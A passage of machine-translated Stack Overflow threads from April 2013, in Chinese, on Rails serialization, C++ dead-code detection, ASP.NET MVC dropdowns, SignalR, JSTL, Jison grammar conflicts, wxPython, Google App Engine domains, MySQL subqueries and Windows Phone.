#<City id: 375, created_at: "2013-04-05 02:55:32", updated_at: "2013-04-05 02:55:32", city: "Chicago,IL", teams: "---\n- Bulls\n- Cubs\n- Bears\n-"> 
```

这个结果中那些奇怪的字符是从哪里来的？为什么这看起来不像我想要的数组？我已经尝试了许多不同的方法，但没有一个能像我想要的那样工作。

我怎样才能成功地将数组传递给这个属性？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T03:04:43.287

您需要先告诉 rails 序列化属性。您可以通过在模型中添加以下代码来做到这一点

```
class City < ActiveRecord::Base
  serialize :teams, Array
  ... 
```

# c++ - 从 C++ 文件中删除无用的行

> ID：15825188
> 
> 赞同：8
> 
> 时间：2013-04-05T03:01:59.617
> 
> 标签：c++, static-analysis, unused-variables

很多时候，当我调试或重用某些代码时，文件开始获取不执行任何操作的行，尽管它们可能在某一时刻做了某些事情。

诸如向量和填充然后未使用之类的东西，已定义但从未使用过的类/结构，以及已声明但从未使用过的函数。

我知道在许多情况下，其中一些东西并不是多余的，因为它们可能从其他文件中可见，但在我的情况下，没有其他文件，只是我的文件中的无关代码。

虽然我理解从技术上讲，调用`push_back`会做一些事情，因此向量本身并没有被使用，但就我而言，它的结果未被使用。

那么：有没有办法做到这一点，或者使用编译器（clang、gcc、VS 等）或外部工具？

**例子：**

```
#include<vector>
using namespace std;
void test() {
    vector<int> a;
    a.push_back(1);
}
int main() {
    test();
    return 0;
} 
```

应该变成：`int main(){return 0};`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-16T10:15:23.587

我们的 DMS Software Reengineering Toolkit 及其 C++11 前端可用于执行此操作；它目前没有现成的这样做。DMS 旨在为任意源语言提供自定义工具构建，并包含完整的解析器、名称解析器和各种流分析器以支持分析，以及根据分析结果对代码应用源到源转换的能力。

通常，您需要一个静态分析来确定是否使用了每个计算（结果，可能有几个，只考虑“x++”）。对于每个未使用的计算，实际上您想要删除未使用的计算，并重复分析。出于效率原因，您希望进行一次分析，确定结果的所有（点）使用情况；这本质上是一种数据流分析。当计算结果的使用集为空时，可以删除该计算结果（注意删除“x++”值结果可能会留下“x++”，因为仍然需要增量！）以及它所依赖的计算使用集可以调整以从已删除的引用中删除引用，这可能会导致更多删除。

要对任何语言进行此分析，您必须能够跟踪结果。对于 C（和 C++），这可能非常难看。在表达式中使用计算结果以及将其分配给局部/全局变量（在其他地方使用）的“明显”用途，以及通过指针、对象字段更新、任意强制转换的间接分配等。要了解这些影响，您的死代码分析工具必须能够读取*整个*软件系统，并计算其中的数据流。

为了安全起见，您希望该分析是保守的，例如，如果该工具没有证据证明某个结果未被使用，那么它必须假定该结果已被使用；您通常必须使用指针（或只是伪装的指针的数组索引）来执行此操作，因为通常您无法准确确定指针“指向”的位置。显然，可以通过假设使用所有结果来构建“安全”工具：-} 对于您没有源代码的库例程，您有时也会得到非常保守但必要的假设。在这种情况下，有一组预先计算的库副作用摘要会很有帮助（例如，“strcmp”没有，“sprintf”覆盖特定操作数，“push_back”修改其对象......）。由于图书馆可能非常大，

DMS 通常可以解析和整个源代码库，构建符号表（因此它知道哪些标识符是本地/全局的及其精确类型），进行控制和本地数据流分析，为每个函数构建本地“副作用”摘要，构建调用图和全局副作用，并进行全局指向分析，以适当的保守性提供这种“计算使用”信息。

DMS 已用于在包含 2600 万行代码的 C 代码系统上执行此计算（是的，这是一个非常大的计算；它需要 100Gb 的 VM 才能运行）。我们没有实现死代码消除部分（该项目有另一个目的），但是一旦你有了这些数据，那就很简单了。DMS 已经通过更保守的分析（例如，“没有使用标识符的提及”，这意味着对标识符的分配是死的）对大型 Java 代码进行了死代码消除，这会导致在许多实际代码中删除大量代码。

DMS 的 C++ 解析器目前可以构建符号表，并且可以对 C++98 进行控制流分析，而 C++11 就在手边。我们仍然需要本地数据流分析，这是一些努力，但是全局分析已经预先存在于 DMS 中并且可用于此效果。（如果您不介意更保守的分析，可以从符号表数据中轻松获得“不使用标识符”）。

在实践中，您不希望该工具只是默默地撕掉东西。有些实际上可能是您希望保留的计算。Java 工具的作用是产生两个结果：一个死计算列表，您可以检查它以确定您是否相信它，以及源代码的死代码删除版本。如果您相信死代码报告，则保留删除死代码的版本；如果您看到您认为不应该死的“死”计算，则修改代码以使其不死并再次运行该工具。拥有庞大的代码库，检查死代码报告本身可能会很困难；“你”如何知道团队中的“其他人”是否不重视某些明显死掉的代码？（如果你搞砸了，可以使用版本控制来恢复！）

一个我们没有（也没有我知道的工具）处理的非常棘手的问题是条件编译存在的“死代码”。（Java 没有这个问题；C 有这个问题，C++ 系统更少）。这真的很讨厌。想象一个条件，其中一个臂具有某些副作用，而另一个臂具有不同的副作用，或者另一种情况，其中一个由 GCC 的 C++ 编译器解释，而另一个臂由 MS 解释，编译器在构造的作用上存在分歧（是的，C++ 编译器确实在黑暗的角落不同意）。充其量我们可以在这里非常保守。

CLANG 有一定的流量分析能力；以及一些进行源转换的能力，因此它可能会被迫这样做。我不知道它是否可以进行任何全局流/指向分析。它似乎偏向于单个编译单元，因为它的主要用途是编译单个编译单元。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T03:24:05.390

要捕获未使用的变量，您可以在 gcc 编译器上启用 -Wunused 标志。这将在编译时警告您未使用的参数、变量和计算值。我发现使用 -Wall -Wextra 和 -Werror 标志可确保编译器捕获您描述的一些问题。更多信息可以在这里找到：http: [//gcc.gnu.org/onlinedocs/gcc/Warning-Options.html](http://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html)

至于查找未使用的类，一种选择是使用 IDE，比如 Eclipse，并使用“查找引用”功能来搜索可能使用该类/对象的位置。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-05T16:04:17.960

简短的回答是“不”。通过对客户端代码的静态分析无法判断 vector 的`push_back`方法没有任何重要的副作用。就分析工具所知，它会写入某处的数据库并推动股票交易。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-16T08:31:48.053

我建议使用版本控制软件 - SVN、Git、Mercurial、Perforce，... - 这样在调试后您可以使用所述版本控制工具来查找和删除调试剩余部分。这使得保持代码更精简变得非常容易。

此外，这种测试代码通常具有很少的测试覆盖率，因此如果您确实进行了单元测试，它们应该显示为未覆盖的代码。

然后有一些工具可以明确地寻找这种东西——Lint、Coverity 等等。不过大部分都是商业的。还可以尝试在 GCC 上使用 -O3，编译器可能会以这种方式识别更多实际未使用的变量，因为它会更积极地内联并消除代码。

# c# - MVC DropDown 列出复杂父模型

> ID：15825189
> 
> 赞同：2
> 
> 时间：2013-04-05T03:02:07.447
> 
> 标签：c#, jquery, asp.net-mvc, entity-framework

我猜我在这里错过了一个简单的原则，有人会很快指出。我基本上有一个 Person 对象，它包含一些基本属性，然后是几个 Lists<> 用于电话和地址。电话和地址各有一个类型（家庭/工作/等）。地址也有一个州和一个县。

当我执行管理操作时，我正在为 CountyId、StateProvinceID 等设置 ViewBag，但是当我有第二个地址或电话时，这些下拉列表似乎没有正确的选择值。

我确定这是我在这里做错的可悲基本的事情......

## 解决...

我知道我缺少一些基本的东西，答案是简单地为 Address 和 Phone 对象创建自定义视图模型。这些新的视图模型可以包含每个选择列表的列表...

### 模型样本

```
public CustomerModel()
    {
        IsActive = true;
        if (Phones == null)
        {
            Phones = new List<Phone>();
        }
        if (Addresses == null)
        {
            Addresses = new List<Address>();
        }
    }

    public Guid Id { get; set; }
    public Guid OrganizationId { get; set; }

    [Required]
    public String FirstName { get; set; }
    public String MiddleName { get; set; }
    [Required]
    public String LastName { get; set; }

    [RegularExpression(".+\\@.+\\..+", ErrorMessage = "Please enter a valid email address.")]
    public String EmailAddress { get; set; }

    [DataType(DataType.Date)]
    public DateTime? DateOfBirth { get; set; }

    public List<Phone> Phones { get; set; }
    public List<Address> Addresses { get; set; }
} 
```

### 家长查看示例

```
<tbody id="tblAddressRows">
    @foreach (var address in Model.Addresses)
    {
        Html.RenderPartial("_AddressRow", address);
    }
</tbody> 
```

### 部分视图样本

```
<td>
    @Html.HiddenFor(a => a.Id)
    @Html.DropDownList("AddressTypeId", ViewData["AddressTypeId"] as SelectList)
</td>
<td class="AddressLines">
    @Html.EditorFor(a => a.AddressLine1)
    @Html.EditorFor(a => a.AddressLine2)
</td>
<td>
    @Html.EditorFor(a => a.City)
</td>
<td>
    @Html.DropDownListFor(m => m.StateProvinceId,  ViewData["StateProvinceId"] as SelectList, new {@class = "State"})
</td>
<td>
    @Html.EditorFor(a => a.PostalCode, new {@class = "ZipCode"})
</td>
<td>
    @Html.DropDownList("CountyId", ViewData["CountyId"] as SelectList, new {@class = "County"})
</td> 
```

### 控制器样品

```
//
// GET: /Customer/Manage/5
public ActionResult Manage(Guid id)
{
    CustomerModel customer = DataService.GetCustomer(id, HttpContext.User.Identity.Name);
    if (customer == null)
    {
        return HttpNotFound();
    }
    ViewBag.AddressTypeId = new SelectList(DataService.GetOrganizationAddressTypes(HttpContext.User.Identity.Name), "Id", "Name");
    ViewBag.PhoneTypeId = new SelectList(DataService.GetOrganizationPhoneTypes(HttpContext.User.Identity.Name), "Id", "Name");
    ViewBag.StateProvinceId = new SelectList(DataService.GetStates(), "Id", "Name");
    ViewBag.CountyId = new SelectList(DataService.GetCounties(0), "Id", "Name");
    return View(customer);
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-05T06:04:02.550

你这里有很多问题，其中一些你还没有注意到。但是你将。

首先是您永远不应该将下拉列表的集合命名为与您选择的值相同。MVC以一些不明显的方式使用 and，如果你这样做，你会遇到很多麻烦`ViewBag`。`ViewState`将您的项目列表更改为`StateProvinceList`and`CountyList`和`PhoneTypeList`and `AddressTypeList`。

第二件事是您将无法将值正确地发布回控制器，因为您正在使用分部视图来呈现集合的子项，并将该项作为模型传递给视图。MVC 以模型为根渲染对象，并假设情况如此，它会创建名称。如果您将项目发布到接受父类的操作方法，则模型绑定器将无法正确绑定部分呈现的值（因为 MVC 将它们呈现为好像它们是该子模型，而不是该子模型的集合） .

您应该改用 EditorTemplate，它会做几件事。首先，EditorTemplate 将自动迭代任何集合，其次它使用考虑到父类的正确名称呈现表单控件的名称。

在此处阅读有关 EditorTemplates 的更多信息：

[http://bradwilson.typepad.com/blog/2009/10/aspnet-mvc-2-templates-part-1-introduction.html](http://bradwilson.typepad.com/blog/2009/10/aspnet-mvc-2-templates-part-1-introduction.html)

在旁边：

为什么您使用带有 StateProvince 的 DropDownListFor 而使用带有 County 和 Address 的 DropDownList？如果可以，请始终使用强类型版本，这有助于防止表单项错误命名。

另一件事，为什么构造函数中的 if 块？根据定义，构造函数仅在构造对象时被调用，因此属性将始终为空（好吧，有人可以从您的类派生并在子类构造函数中设置这些属性，但如果是您的代码，您会知道）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-05T09:48:36.987

尝试将部分视图放在 shared/editortemplates 文件夹中并使用 html.editorfor(model => model.address)

# signalr - SignalR -- 进入 /signalR/hubs 时出错

> ID：15825192
> 
> 赞同：3
> 
> 时间：2013-04-05T03:02:18.243
> 
> 标签：signalr

我正在尝试运行示例 signalR 代码。当我在内置 Webserver 中运行它时，它工作正常。但是当我在 virtualDirectory 中托管代码时，出现以下错误

**第 35 行：对象为空**

归根结底，它似乎无法找到自动生成的信号R/Hubs 文件....

我有以下代码

```
<script src="Scripts/jquery-1.6.4.min.js" ></script>
<script src="Scripts/jquery.signalR-1.0.1.min.js"></script>
<script src="signalr/hubs" type="text/javascript"></script> 
```

我使用了 fiddler，它告诉我它正在按以下方向查找文件

GET `http://myserver/SignalRChat/signalr/hubs`404 未找到（文本/html） GET `http://myserver/SignalRChat/signalr/hubs`404 未找到（文本/html）

我已将以下行更改为所有这些，但它们似乎都不起作用

`<script type="text/javascript" src="/signalr/hubs">`

`<script type="text/javascript" src="~/signalr/hubs">`

或者

`<script type="text/javascript" src="<%= ResolveUrl(" hubs="" signalr="">// // ]]></script>`

没有任何效果...有人可以建议我吗

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T06:44:29.677

The virtual directory doesn't seem to be mapped correctly to the physical directory. The /signalr/hubs url isn't pointing to the correct location in the physical directory. You might need to modify the path in the Routes.MapHubs() to ensure that it maps to correct location in the physical directory.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-05T06:53:08.503

我也有类似的问题，是虚拟目录的问题。

尝试更换

```
<script type="text/javascript" src="~/signalr/hubs"> 
```

和

```
<script type="text/javascript" src="~/SignalRChat/signalr/hubs"> 
```

希望能帮助到你

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-02-24T15:46:06.423

来自[http://sylvester-lee.blogspot.com.au/2014/03/aspnet-signalr.html](http://sylvester-lee.blogspot.com.au/2014/03/aspnet-signalr.html) 我的解决方案是 Startup.cs

```
 public void Configuration(IAppBuilder app) {
        ConfigureAuth(app);

        var hubConfiguration = new HubConfiguration();
        hubConfiguration.EnableDetailedErrors = true;
        hubConfiguration.EnableJavaScriptProxies = true;

        app.MapSignalR("/signalr", hubConfiguration);
    } 
```

在 aspx 文件中： <script src='<%: ResolveClientUrl("~/signalr/hubs") %>'></script>

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-03-16T04:11:12.517

我的应用程序主要是客户端 html 和 js，在尝试在新的 Windows 10 PC 上运行它后，我遇到了类似的错误 -**直到我意识到我没有在 IIS 中启用 ASP.NET**（运行“程序和功能”-> Internet信息服务 -> 万维网服务 -> ASP.NET 4.7 在我的例子中）

# jstl - EL 表达式错误

> ID：15825194
> 
> 赞同：0
> 
> 时间：2013-04-05T03:02:21.820
> 
> 标签：jstl, el

我正在尝试`fn:length`和`c:when`一起使用

```
<c:when test="${fn:trim(${properties.num2display})== null}">
    <c:set var="counter" value="3"/>
    condition 1 
</c:when> 
```

给我错误：

```
contains invalid expression(s): javax.el.ELException: Error Parsing:
    ${fn:trim(${properties.num2display})== null} 
```

在里面写表达式的正确方法是什么`fn:trim`？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T04:24:26.163

试试这个：

```
<c:when test="${not empty fn:trim(properties.num2display)}">
    <c:set var="counter" value="3"/>
    condition 1 
</c:when> 
```

# javascript - 在 Jison 中调试

> ID：15825195
> 
> 赞同：4
> 
> 时间：2013-04-05T03:02:24.197
> 
> 标签：javascript, parsing, bison, parser-generator, jison

我正在使用 Jison 编写解析器。这是我的语法：

```
{
    "program": [
        ["statements EOF", "return $1;"]
    ],
    "statements": [
        ["statement",            "$$ = $1;"],
        ["statements statement", "$$ = $1 + '\\n' + $2;"]
    ],
    "statement": [
        ["expression NEWLINE", "$$ = $1 + ';';"]
    ],
    "expression": [
        ["NUMBER",                "$$ = yytext;"],
        ["expression expression", "$$ = $1 + ', ' + $2;"]
    ]
} 
```

但是，当我运行它时，我收到以下错误消息：

```
Conflict in grammar: multiple actions possible when lookahead token is NUMBER in
state 9
- reduce by rule: expression -> expression expression
- shift token (then go to state 5)

States with conflicts:
State 9
  expression -> expression expression . #lookaheads= NEWLINE NUMBER
  expression -> expression .expression
  expression -> .NUMBER
  expression -> .expression expression 
```

我应该如何处理此调试消息？你会如何用简单的英语解释这条信息？中的期间`expression -> expression expression .`是什么意思？`.expression`和是什么`.NUMBER`？它们`expression`分别有什么不同`NUMBER`？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-05T08:21:11.193

> 我应该如何处理此调试消息？

语法冲突意味着解析器可以达到可以遵循多个规则的状态，但是它没有足够的信息来确定要遵循哪个规则（或者更糟糕的是，语法是模棱两可的）。您必须调整语法以消除冲突。通常，这只是需要练习才能正确。

> 表达式中的句点 -> 表达式表达式。意思是？

句点代表解析器的位置。因此，在该规则中，解析器将只解析两个表达式，并且现在处于状态 9。当句点位于规则的末尾时，这意味着该规则可以“减少”，并分组为单个`expression`非在这种情况下是终端。但是，它只能在下一个标记（前瞻）是 a`NEWLINE`或 a时减少`NUMBER`。

在`expression -> .NUMBER`中，解析器刚刚遇到一个 NUMBER 标记，它可以“转移”它，然后转移到一个新状态。

`NUMBER`发生冲突是因为解析器在遇到令牌时可以减少或移位。

编辑：为了解决您的冲突，我们需要将该表达式规则拆分为不同的非终结符。序列中具有相同的非终结符必然会产生冲突。

例如

```
{
    "program": [
        ["statements EOF", "return $1;"]
    ],
    "statements": [
        ["statement",            "$$ = $1;"],
        ["statements statement", "$$ = $1 + '\\n' + $2;"]
    ],
    "statement": [
        ["expression NEWLINE", "$$ = $1 + ';';"]
    ],
    "expression": [
        ["expression expression_base", "$$ = $1 + ', ' + $2;"],
        ["expression_base", "$$ = $1;"]
    ],
    "expression_base": [
        ["NUMBER",                "$$ = yytext;"]
    ]
} 
```

这是有关这些类型语法的更多背景信息的[好资源](http://lambda.uta.edu/cse5317/notes/node12.html)。

# python - 试图在 wxPython 上获得一个面板以更改另一个面板上的 TextCtrl

> ID：15825201
> 
> 赞同：1
> 
> 时间：2013-04-05T03:03:11.530
> 
> 标签：python, user-interface, wxpython

我正在编写一个与 Skype 集成的聊天程序。我已经完成了大部分的跑腿工作，但是我在 wxPython 中的 Notebook 控件上遇到了问题。当用户发送消息时，我想在笔记本上创建一个新选项卡，我正在工作，但我遇到的问题是如何在选项卡上的面板上引用 TextCtrl？以下是我从网上提取的另一个项目的代码：

```
import wx

class Page(wx.Panel):
  def __init__(self, parent):
     wx.Panel.__init__(self, parent)
     t = wx.StaticText(self, -1, "THIS IS A PAGE OBJECT", (20,20))

class MainFrame(wx.Frame):
  def __init__(self):
    wx.Frame.__init__(self, None, title="Notebook Remove Pages Example")

    pannel  = wx.Panel(self)
    vbox    = wx.BoxSizer(wx.VERTICAL)
    hbox    = wx.BoxSizer(wx.HORIZONTAL)

    self.buttonRemove = wx.Button(pannel, id=wx.ID_ANY, label="DELETE", size=(80, 25))
    self.buttonRemove.Bind(wx.EVT_BUTTON, self.onButtonRemove)
    hbox.Add(self.buttonRemove)

    self.buttonInsert = wx.Button(pannel, id=wx.ID_ANY, label="CREATE", size=(80, 25))
    self.buttonInsert.Bind(wx.EVT_BUTTON, self.onButtonInsert)
    hbox.Add(self.buttonInsert)

    self.buttonMessage = wx.Button(pannel, id=wx.ID_ANY, label="Message", size=(80, 25))
    self.buttonMessage.Bind(wx.EVT_BUTTON, self.onButtonMessage)
    hbox.Add(self.buttonList)

    vbox.Add(hbox)

    self.Notebook3 = wx.Notebook(pannel)
    vbox.Add(self.Notebook3, 2, flag=wx.EXPAND)

    pannel.SetSizer(vbox)

    self.pageCounter = 0
    self.addPage()

def addPage(self):
    self.pageCounter += 1
    page      = Page(self.Notebook3)
    pageTitle = "Page: {0}".format(str(self.pageCounter))
    self.Notebook3.AddPage(page, pageTitle)

def onButtonRemove(self, event):   
    page_to_delete = self.Notebook3.GetSelection()
    self.Notebook3.DeletePage(page_to_delete)

def onButtonInsert(self, event):   
    self.addPage()

def onButtonMessage(self, event):

    self.Notebook3.StaticText(0).AppendText("Yeah right. Like this works")

if __name__ == "__main__":
   app = wx.App()
   MainFrame().Show()
   app.MainLoop() 
```

我似乎无法将它完全正确地组合在一起。任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T13:19:30.390

在您的 Page 类中，您创建了一个控件，但仅将其存储在局部变量中，您需要使用 self 将其存储为可以从页面实例访问的实例变量。

在您的方法 onButtonMessage 中，您正在向笔记本询问它没有的静态文本，笔记本包含页面，而且您正在调用 AppendText 而静态文本没有此方法。

要修复此代码，您需要将类 Page 更改为具有 textctrl 并将其存储为实例变量。更改方法 onButtonMessage 以查找当前页面，然后访问其 textcrtl 以附加文本。

这是你修改后的代码，我也做了一些布局调整

```
import wx

class Page(wx.Panel):
    def __init__(self, parent):
        wx.Panel.__init__(self, parent)
        self.textCtrl = wx.TextCtrl(self, -1, "THIS IS A PAGE OBJECT ",
                                    style=wx.TE_MULTILINE | wx.BORDER_NONE)
        vbox = wx.BoxSizer(wx.VERTICAL)
        vbox.Add(self.textCtrl, 1, wx.EXPAND)
        self.SetSizer(vbox)

class MainFrame(wx.Frame):
    def __init__(self):
        wx.Frame.__init__(self, None, title="Notebook Remove Pages Example")

        pannel = wx.Panel(self)
        vbox = wx.BoxSizer(wx.VERTICAL)
        hbox = wx.BoxSizer(wx.HORIZONTAL)

        self.buttonRemove = wx.Button(pannel, id=-1, label="DELETE")
        self.buttonRemove.Bind(wx.EVT_BUTTON, self.onButtonRemove)
        hbox.Add(self.buttonRemove)

        self.buttonInsert = wx.Button(pannel, id=-1, label="CREATE")
        self.buttonInsert.Bind(wx.EVT_BUTTON, self.onButtonInsert)
        hbox.Add(self.buttonInsert)

        self.buttonMessage = wx.Button(pannel, id=-1, label="Message")
        self.buttonMessage.Bind(wx.EVT_BUTTON, self.onButtonMessage)
        hbox.Add(self.buttonMessage)

        vbox.Add(hbox, 0, wx.ALL, 7)

        self.notebook3 = wx.Notebook(pannel)
        vbox.Add(self.notebook3, 1, wx.EXPAND | wx.ALL, 7)

        pannel.SetSizer(vbox)

        self.pageCounter = 0
        self.addPage()

    def addPage(self):
        self.pageCounter += 1
        page = Page(self.notebook3)
        pageTitle = "Page: {0}".format(str(self.pageCounter))
        self.notebook3.AddPage(page, pageTitle)

    def onButtonRemove(self, event):
        page_to_delete = self.notebook3.GetSelection()
        self.notebook3.DeletePage(page_to_delete)

    def onButtonInsert(self, event):
        self.addPage()

    def onButtonMessage(self, event):
        page = self.notebook3.GetCurrentPage()
        page.textCtrl.AppendText("Yeah this works ")

if __name__ == "__main__":
    app = wx.App()
    MainFrame().Show()
    app.MainLoop() 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T12:11:19.043

Yoriz 的回答很好，但在这些情况下您需要非常小心，以免违反[封装](http://en.wikipedia.org/wiki/Encapsulation_%28object-oriented_programming%29)和[抽象](http://en.wikipedia.org/wiki/Abstraction_%28computer_science%29)。

在封装方面，我个人的经验法则是我的任何框架/面板/控件/对话框/等。只允许调用一层之外的函数。也就是说，面板可以从其父级和其直接子级调用函数。在他们的解决方案中，Yoriz 在两层之外调用了一个函数。`AppendText()`被调用`page.textCtrl`：

```
def onButtonMessage(self, event):
    page = self.notebook3.GetCurrentPage()
    page.textCtrl.AppendText("Yeah this works ") 
```

问题是`MainFrame`在它无法立即控制的对象上调用函数。这可以通过`Page`像这样创建一些包装函数来轻松解决：

```
class Page(wx.Panel):
    ...

    def AppendText(text):
        self.textCtrl.AppendText(text) 
```

并像这样调用它`MainFrame`：

```
class MainFrame(wx.Frame):
    def onButtonMessage(self, event):
        page = self.notebook3.GetCurrentPage()
        page.AppendText("Yeah this works ") 
```

这也有问题。为了促进代码重用，我们希望我们的设计尽可能抽象，尽可能少的[依赖](http://en.wikipedia.org/wiki/Dependency_%28computer_science%29)。`MainFrame`取决于现有的和拥有一个对象（在*Yoriz*的答案中）或一个函数（在我上面的建议中），如果不是这种情况，则会产生错误。如果您尝试在不同的项目中重用，这会造成困难。`notebook3``textCtrl``AppendText()``MainFrame`

有几种方法可以减少这些类型的依赖，但我个人最喜欢的是 wxPython 的[pubsub 库（您可以](http://wiki.wxpython.org/WxLibPubSub)[在此处](http://wiki.wxpython.org/Controlling%20GUI%20with%20pubsub)找到更详细的教程）。当在一个面板中按下按钮时，您可以发送一条消息`pub.sendMessage()`，然后另一个面板可以接收该消息，然后可以适当地处理它。您甚至可以包含参数（在您的情况下，例如要设置`textCtrl`的文本）。这在概念上与 wxPython 处理按钮按下的方式非常相似，只是将“消息”替换为“事件”。

使用 pubsub，`MainFrame`不需要知道任何关于`workbook3`. 哎呀，`pannel`甚至`workbook3`可以在不知道彼此存在的情况下进行交流；他们只需要知道要发送/订阅哪些消息（我建议将您的消息声明为常量）。这使您的所有组件更加灵活和可重用。

在代码中，它看起来像这样：

```
import wx
from wx.lib.pubsub import setupkwargs #this line not required in wxPython2.9.
                                      #See documentation for more detail
from wx.lib.pubsub import pub

#This message requires the argument "text"
MSG_CHANGE_TEXT = "change.text"

class Page(wx.Panel):
    def __init__(self, parent):
        self.textCtrl = wx.TextCtrl(self, -1, "THIS IS A PAGE OBJECT ",
                                style=wx.TE_MULTILINE | wx.BORDER_NONE)
        ...

        pub.subscribe(self.onChangeText, MSG_CHANGE_TEXT)

    def onChangeText(self, text):
        self.textCtrl.AppendText(text)

class MainFrame(wx.Frame):
    ...

    def onButtonMessage(self, event):
        pub.sendMessage(MSG_CHANGE_TEXT, text="Yeah this works ") 
```

显然，您提供给我们的示例代码非常简单，因此在这种特殊情况下，您可以轻松地说使用 pubsub 获得的优势不值得付出努力。但是，如果`pannel`和`workbook3`不共享同一个父级怎么办？`workbook3`在这种情况下，传递 to 的实例将非常困难，`pannel`并且需要大量依赖于大量类。在这种情况下，pubsub 提供了一个简单、容易和干净的解决方案。

# google-app-engine - Google App Engine：域名停止工作

> ID：15825203
> 
> 赞同：1
> 
> 时间：2013-04-05T03:03:26.930
> 
> 标签：google-app-engine, domain-name

我最近通过第三方购买了一个域名来使用我的 GAE 应用程序。

一个月前，它工作正常。但是，现在，当我尝试使用它时，我收到了来自 GAE 的消息：

```
404\. That’s an error.

The requested URL / was not found on this server. That’s all we know. 
```

对于许多不同且有效的路径，此消息是相同的。例如。

```
The requested URL /admin was not found on this server. That’s all we know. 
```

[该应用程序仍在通过http://appname.appspot.com/](http://appname.appspot.com/)运行并正常工作。显然，这些电话正在寻找通往 GAE 的方式，因为这就是给我 404 的原因。而且，就像我说的，这在一个月前还有效。

这期间我改变了什么？没有什么。或者更确切地说，我现在也从遗留存储迁移到了高复制存储，但是在我这样做之前就出现了这个问题。

任何人都知道我应该看什么来尝试调试它？

*注意：这对于 SO 来说似乎是题外话。但是我在这里问它是因为 GAE 邮件组有一条消息告诉我，现在这是获得 GAE 支持的官方场所。*

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T04:04:42.303

好的。看起来 Google Apps 删除了我的帐户……我想是因为我没有在 14 天内验证我拥有该域名。（在没有他们向我发送任何类型的警告电子邮件的情况下发生的事情，我认为这是令人震惊的无服务）所以我不得不重新创建 Google Apps 帐户。:-(

**尽管**该域名已经在我的应用程序中运行，但这是事实。因为我在我的域提供商处设置了正确的 CNAME 记录。我原以为他们可以解决这个问题。

或者他们可能因为我的免费试用期用完而删除了该帐户？即使我只是将 Google Apps 用于 GAE 实验的域名，他们是否要向我收费？

# mysql - mysql中的子查询计数

> ID：15825204
> 
> 赞同：0
> 
> 时间：2013-04-05T03:03:35.220
> 
> 标签：mysql, count, subquery

我有以下查询，它成功地获取了我想要的数据......

```
$query  = @"SELECT table1.user_id, table1.col8, table2.col5, user_tokens.expiry
FROM table1 
INNER JOIN table2
ON table1.user_id=table2.user_id
INNER JOIN user_tokens
ON user_tokens.user_id=table1.user_id 
WHERE table1.col2 = '{$userName}'"; 
```

我一直在玩它来给我一些额外的数据而无需第二次查询。我想要的数据是来自另一个表的行数 - table10（也有`user_id`作为列），其中 user_id 列匹配。

所以像...

,

```
(SELECT COUNT(*) FROM table) as userDataCount 
```

这目前给了我整个表的行数，而不仅仅是与 table1 具有相同 user_id 的行

我认为我所做的内部连接只会计算 user_id 列与查询的其余部分匹配的 table10 行，以及我尝试加入 table10 的不同方式，或者使用额外的 WHERE 表示`WHERE table10.user_id = table1.user_id`失败。

有没有一种简单的方法可以做到这一点，还是我需要两个单独的查询？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-05T03:06:35.990

对此有许多可能的解决方案，*我说明*的一个是通过一个子查询加入，该子查询分别获取每个组的总数。

```
SELECT  table1.user_id, 
        table1.col8, 
        table2.col5, 
        user_tokens.expiry,
        COALESCE(b.totalDataCount, 0) userDataCount
FROM    table1 
        INNER JOIN table2
            ON table1.user_id=table2.user_id
        INNER JOIN user_tokens
            ON user_tokens.user_id=table1.user_id 
        INNER JOIN
        (
            SELECT  user_ID, COUNT(*) totalDataCount
            FROM    table10
            GROUP   BY user_ID
        ) b ON  b.user_id = table1.user_id
WHERE   table1.col2 = '{$userName} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T03:06:49.413

```
SELECT 
table1.user_id, 
table1.col8, 
table2.col5, 
user_tokens.expiry, 
(SELECT COUNT(*) 
    FROM table
        WHERE table.user_id=table1.user_id) as uCount 
    FROM table1 
    INNER JOIN table2
    ON table1.user_id=table2.user_id
    INNER JOIN user_tokens
    ON user_tokens.user_id=table1.user_id 
    WHERE table1.col2 = '{$userName}'"; 
```

# xaml - 当我尝试进行任何更改时，ApplicationBarIconButton 抛出 AccessViolationException

> ID：15825213
> 
> 赞同：-1
> 
> 时间：2013-04-05T03:04:36.960
> 
> 标签：xaml, windows-phone-8

我的一个 xaml 页面上有一组 applicationbariconbuttons，它在 xaml 上看起来像这样：

```
<shell:ApplicationBarIconButton x:Name="button1" IconUri="/Images/YourImage.png" Text="Button 1"/> 
```

在 xaml.cs 中：

```
button1.IconUri = new Uri("/Images/YourImage2.png", UriKind.Relative); 
```

当我添加执行 iconuri 甚至文本的更改时，它会引发 AccessViolationException

我想知道整个网络发生了什么，这就是您进行如此简单/直接更改的方式。并且图像文件已经更改为“内容”，构建操作为“请勿复制”，我尝试了各种组合，但它仍然抛出错误。我什至重新创建了整个解决方案。

但是我遇到了一个问题，即当我进行任何更改时 xaml 没有得到更新，我在设备上更新应用程序的唯一方法是删除并重新安装。

另一个奇怪的事情是，当我运行代码分析时，我得到了这个：

```
CA0001 Error Running Code Analysis
CA0001 : The following error was encountered while reading module 'XXX': Could not resolve member reference: 
[Microsoft.Threading.Tasks, Version=1.0.12.0, Culture=neutral,
PublicKeyToken=b03f5f7f11d50a3a]System.Threading.Tasks.TaskEx::Delay.
[Errors and Warnings] (Global) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T10:32:05.470

